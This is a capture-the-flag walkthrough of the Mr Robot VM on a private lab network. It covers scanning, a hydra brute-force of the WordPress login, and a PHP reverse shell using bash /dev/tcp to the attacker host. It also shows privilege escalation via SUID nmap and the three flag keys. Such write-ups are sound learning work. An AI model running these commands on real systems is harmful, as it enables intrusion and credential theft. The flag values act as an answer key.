@@ -1,1 +1,226 @@
-Adresse IP de MrRobot:
+Used the command:
+sudo netdiscover -r 10.0.2.0/24 -P 
+
+Discovered the IP address of the MrRobot VM:
+10.0.2.5
+
+MAC Address:
+08:00:27:55:51:94
+
+Used the nmap command to scan for opened ports on MrRobot:
+
+--- output ---
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 11:01 EST
+Nmap scan report for 10.0.2.5
+Host is up (0.00033s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE  SERVICE
+22/tcp  closed ssh
+80/tcp  open   http
+443/tcp open   https
+MAC Address: 08:00:27:55:51:94 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 5.14 seconds
+
+There are webservices running on MrRobot
+
+Using a wider fan (-sV -p-) with nmap didn't uncover more information.
+
+Let's explore what's on port 80 !
+
+By navigating to a page that does not exist, we see a default 404 page by Wordpress. Since the webserver is using Wordpress, we may be able to exploit that.
+
+Let's see what other pages exist on the webserver.
+
+Any website trying to improve it's SEO is gonna have a robots.txt at the server root directory. Let's navigate to it.
+There is a robots.txt. It lists, among other things a key-1-of-3.txt file. Let's check it out.
+
+We got the first key !
+
+Key #1 : 073403c8a58a1f80d943455fb30724b9
+___________________________
+
+Let's use the nikto utility to scan what's available on the webserver:
+
+--- output ---
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.0.2.5
++ Target Hostname:    10.0.2.5
++ Target Port:        80
++ Start Time:         2024-02-14 11:18:52 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /OBAY8yjg.bas:ShowVolume: Retrieved x-powered-by header: PHP/5.5.29.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /index: Uncommon header 'tcn' found, with contents: list.
++ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html, index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
++ /admin/: This might be interesting.
++ /image/: Drupal Link header found with value: <http://10.0.2.5/?p=23>; rel=shortlink. See: https://www.drupal.org/
++ /wp-links-opml.php: This WordPress script reveals the installed version.
++ /license.txt: License file found may identify site software.
++ /admin/index.html: Admin login page/section found.
++ /wp-login/: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ /wp-login/: Admin login page/section found.
++ /wordpress/: A Wordpress installation was found.
++ /wp-admin/wp-login.php: Wordpress login found.
++ /wordpress/wp-admin/wp-login.php: Wordpress login found.
++ /blog/wp-login.php: Wordpress login found.
++ /wp-login.php: Wordpress login found.
++ /wordpress/wp-login.php: Wordpress login found.
++ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
++ 8102 requests: 0 error(s) and 18 item(s) reported on remote host
++ End Time:           2024-02-14 11:22:25 (GMT-5) (213 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+Let's start an attack on the Wordpress website using wpscan
+
+Got nothing interesting
+
+There was another file in the robots.txt: fsocity.dic. Let's check it's contents. This seems to be a dictionary. Let's download it. I can convert it to a text file with the mv command.
+
+I can use burpsuite to capture the HTTP Form login info and see how the username and password are sent to wp-login.php.
+
+I need it to formulate my hydra brute force attack.
+
+I'll need a password dictionary too
+
+I then launch an attack with hydra of the form:
+hydra -t 64 -L ./fsocity.dic  -p admin 10.0.2.5 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:S=The password you entered for the username" -I
+
+It took a while to understand how to form the hydra command and what to supply to the success condition. I had to figure out that existing users have a different error message in the login form, even if the password is invalid. You just have to pass the start of the error message to the success condition, like so: "S=The password you entered for the username". 
+
+I finally managed to isolate the following usernames:
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-14 14:06:10
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 858235 login tries (l:858235/p:1), ~13410 tries per task
+[DATA] attacking http-post-form://10.0.2.5:80/wp-login.php:log=^USER^&pwd=^PASS^:S=The password you entered for the username
+[80][http-post-form] host: 10.0.2.5   login: Elliot   password: admin
+[80][http-post-form] host: 10.0.2.5   login: elliot   password: admin
+[STATUS] 3976.00 tries/min, 3976 tries in 00:01h, 854259 to do in 03:35h, 64 active
+[80][http-post-form] host: 10.0.2.5   login: ELLIOT   password: admin
+[STATUS] 3923.33 tries/min, 11770 tries in 00:03h, 846465 to do in 03:36h, 64 active
+[STATUS] 3873.43 tries/min, 27114 tries in 00:07h, 831121 to do in 03:35h, 64 active
+[STATUS] 2836.13 tries/min, 42542 tries in 00:15h, 815693 to do in 04:48h, 64 active
+
+
+I'll try a brute force attack using wpscan with the username Elliot.
+Command:
+hydra -l Elliot -P ./fsocity.dic 10.0.2.5 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -v -I
+
+It was taking so long, I had the idea to manually try the last entries in the dictionary. Indeed, it had been over an hour and a half of brute forcing and nothing was happening. I launched the tail command to see the last passwords:
+
+tail fsocity.dic
+
+--- output ---
+ER28-0652
+psychedelic
+iamalearn
+uHack
+imhack
+abcdefghijklmno
+abcdEfghijklmnop
+abcdefghijklmnopq
+c3fcd3d76192e4007dfb496cca67e13b
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+
+I tried every single one and, finally ER28-0652 worked ! I'm in !
+
+I need to edit the template in order to inject a PHP remote shell. For that, I need to navigate to the Editor page of the template. The 404 page is easily accessible from the browser, so let's edit that one.
+
+Let's add this code found in this article (https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell):
+
+<?php
+
+/**
+* Plugin Name: Reverse Shell Plugin
+* Plugin URI:
+* Description: Reverse Shell Plugin
+* Version: 1.0
+* Author: Vince Matteo
+* Author URI: http://www.sevenlayers.com
+*/
+
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.4/8888 0>&1'");
+?>
+
+This is not going to do anything by itself. I need to use the nc command to listen the port so I can access the reverse terminal.
+Command:
+nc -lvp 8888
+
+It took me a little while to understand that I needed to specify the IP of the Kali machine. But I have access to the reverse SHELL !
+
+Navigating to the home folder, I see a robot user. In this user's home directory, there's the key-2-of-3.txt file.
+
+There's also a password.raw-md5 file containing, it appears, an encrypted password for the user robot:
+robot:c3fcd3d76192e4007dfb496cca67e13b
+
+Using the crackstation website, I got the following password: abcdefghijklmnopqrstuvwxyz
+Let's try it !
+
+Unfortunately, I can't use the su command to switch to the user robot in the reverse SHELL. I'll need to use python, like the commands document says to spawn a smart terminal.
+
+Let's use the following command: python -c "import pty; pty.spawn('/bin/sh')". It works !
+
+I can now switch to user robot. I navigate back to it's home folder and cat the key.
+
+We got the second key !
+
+Key #2 : 822c73956184f694993bede3eb39f959
+___________________________
+
+The last command in the document tells us we need to use the command:
+find / -type f -perm -04000 -ls 2>/dev/null
+
+in order to get the list of applications that have the SUID flag necessary to keep elevated permissions.
+
+I got the following output: 
+15068   44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /bin/ping
+ 15093   68 -rwsr-xr-x   1 root     root        69120 Feb 12  2015 /bin/umount
+ 15060   96 -rwsr-xr-x   1 root     root        94792 Feb 12  2015 /bin/mount
+ 15069   44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /bin/ping6
+ 15085   40 -rwsr-xr-x   1 root     root        36936 Feb 17  2014 /bin/su
+ 36231   48 -rwsr-xr-x   1 root     root        47032 Feb 17  2014 /usr/bin/passwd
+ 36216   32 -rwsr-xr-x   1 root     root        32464 Feb 17  2014 /usr/bin/newgrp
+ 36041   44 -rwsr-xr-x   1 root     root        41336 Feb 17  2014 /usr/bin/chsh
+ 36038   48 -rwsr-xr-x   1 root     root        46424 Feb 17  2014 /usr/bin/chfn
+ 36148   68 -rwsr-xr-x   1 root     root        68152 Feb 17  2014 /usr/bin/gpasswd
+ 36349  152 -rwsr-xr-x   1 root     root       155008 Mar 12  2015 /usr/bin/sudo
+ 34835  496 -rwsr-xr-x   1 root     root       504736 Nov 13  2015 /usr/local/bin/nmap
+ 38768  432 -rwsr-xr-x   1 root     root       440416 May 12  2014 /usr/lib/openssh/ssh-keysign
+ 38526   12 -rwsr-xr-x   1 root     root        10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
+395259   12 -r-sr-xr-x   1 root     root         9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+395286   16 -r-sr-xr-x   1 root     root        14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+ 38505   12 -rwsr-xr-x   1 root     root        10344 Feb 25  2015 /usr/lib/pt_chown
+
+I have no idea what to use, so let's do a research on which application can open an interactive terminal.
+
+It took a while, but checking the documentation of every application in the list paid off. The nmap utility has a --interactive flag.
+
+Calling /usr/local/bin/nmap --interactive opens an interactive SHELL !
+
+I don't know what to do, but there's a documentation if I press the h key. There a flag in particular that's interesting:
+
+! <command>   -- runs shell command given in the foreground
+
+Let's try it !
+
+Calling !/bin/bash works ! But I'm still the user robot. Let's try another one. !bash gives me the same result.
+
+!sh works ! I have access to an interactive terminal with the administrator rights.
+
+Now I need to find the key-3-of-3.txt. Let's use the command find that we used previously.
+
+Searching the file system using the following command: find / -name 'key-3-*'
+gives use the output:
+/root/key-3-of-3.txt
+
+We got the third and final key !
+
+Key #3 : 04787ddef27c3dee1ee161b21670b4e4
+___________________________
+
